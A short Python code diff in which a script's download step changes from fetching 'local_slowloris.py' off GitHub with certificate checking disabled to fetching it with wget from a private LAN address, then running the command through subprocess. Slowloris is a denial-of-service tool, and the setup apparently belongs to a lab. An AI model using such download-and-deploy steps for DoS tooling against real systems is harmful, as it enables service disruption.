@@ -21,7 +21,7 @@ def main(argv):
     time.sleep(60)
 
     try:
-        download_the_app = 'wget --no-check-certificate https://raw.githubusercontent.com/masjohncook/local_slowloris/master/local_slowloris.py'
+        download_the_app = 'wget http://192.168.56.132/local_slowloris.py'
         subprocess.run(download_the_app.split(), stdout=subprocess.PIPE)
         
     except Exception as e:
